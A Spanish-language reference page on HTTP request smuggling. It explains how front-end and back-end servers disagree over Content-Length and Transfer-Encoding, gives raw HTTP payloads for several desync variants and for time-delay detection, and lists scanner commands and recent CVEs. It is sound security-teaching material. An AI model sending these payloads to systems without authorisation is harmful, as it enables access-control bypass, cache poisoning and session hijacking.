---
title: "HTTP Request Smuggling"
description: "HTTP Request Smuggling explota la diferencia de interpretación entre frontend (proxy/CDN) y backend sobre dónde termina un request y empieza el siguiente."
category: "Web"
date: 2026-07-18
---
# HTTP Request Smuggling / HTTP Desync

HTTP Request Smuggling explota la **diferencia de interpretación** entre frontend (proxy/CDN) y backend sobre dónde termina un request y empieza el siguiente.

## La raíz: CL vs TE

HTTP/1.1 tiene dos formas de definir el body:
- **Content-Length (CL):** Bytes exactos
- **Transfer-Encoding: chunked (TE):** Body en fragmentos

Cuando frontend y backend usan **distinto header** para determinar el fin del body → smuggling.

---

## Variantes

### CL.TE (Frontend usa CL, backend usa TE)

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Frontend lee **13 bytes** → body completo
- Backend ve chunked → `0` termina el body → `SMUGGLED` es el siguiente request

### TE.CL (Frontend usa TE, backend usa CL)

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /admin HTTP/1.1
Content-Length: 5

x=1
0
```

- Frontend ve chunked → todo es body del request actual
- Backend ve `Content-Length: 4` → body es `5c\n` → el resto es el siguiente request

### TE.TE (ofuscación)

El frontend procesa un TE header, el backend ignora uno ofuscado:

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked       # espacio
Transfer-Encoding: x
[tab]Transfer-Encoding: chunked
```

### H2.CL / H2.TE (HTTP/2 downgrade)

Cuando HTTP/2 se downgradea a HTTP/1.1 hacia el backend:

```http
# En HTTP/2, el body está en el frame, pero se añade un header CL ficticio
:method POST
:path /
content-length: 0

SMUGGLED
```

### CL.0

El backend ignora completamente Content-Length (trata como 0):

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44

GET /admin HTTP/1.1
X-Ignore: x
```

---

## Impacto

- **Cache poisoning:** Servir contenido malicioso a todos los usuarios
- **Session hijacking:** Robar cookies de otros usuarios
- **ACL bypass:** Acceder a `/admin` a través de request cola
- **Web filter bypass:** Saltar WAF

---

## Herramientas

```bash
# HTTP Request Smuggler (Burp extension)
# Burp → BApp Store → HTTP Request Smuggler

# smuggler.py
python3 smuggler.py -u https://target.com

# h2csmuggler (HTTP/2 cleartext)
python3 h2csmuggler.py -x https://target.com/api/ --test

# nuclei
nuclei -l alive.txt -t ~/nuclei-templates/vulnerabilities/smuggling/
```

---

## Detección con time-delay

### CL.TE

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

Si el servidor tarda >30s en responder → TE procesa `0\r\n` y espera más chunks.

### TE.CL

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

Time-out → TE.CL confirmado.

---

## CVEs y técnicas recientes

| CVE/Técnica | Año | Descripción |
|-------------|-----|-------------|
| CVE-2025-32094 | 2025 | Akamai line folding smuggling (Black Hat 2025) |
| CVE-2025-4366 | 2025 | Cloudflare Pingora smuggling |
| CVE-2025-55315 | 2025 | Chunk-extension smuggling (F5 NGINX) |
| TE.0 | 2024 | Desync entre CDNs (PortSwigger Top 10 2024, $200k+ en bounties) |
| HTTP/1.1 Must Die | 2025 | Kettle: migrar a HTTP/2 end-to-end como única solución durable |

## Relacionado
- **Cache Poisoning y Web Cache Deception** — smuggling → cache poisoning
- **Host Header Injection** — desync combinado con Host manipulation
- **SSRF** — routing-based SSRF via smuggled Host header
- **Claude-BugHunter** (skill `hunt-http-smuggling`)
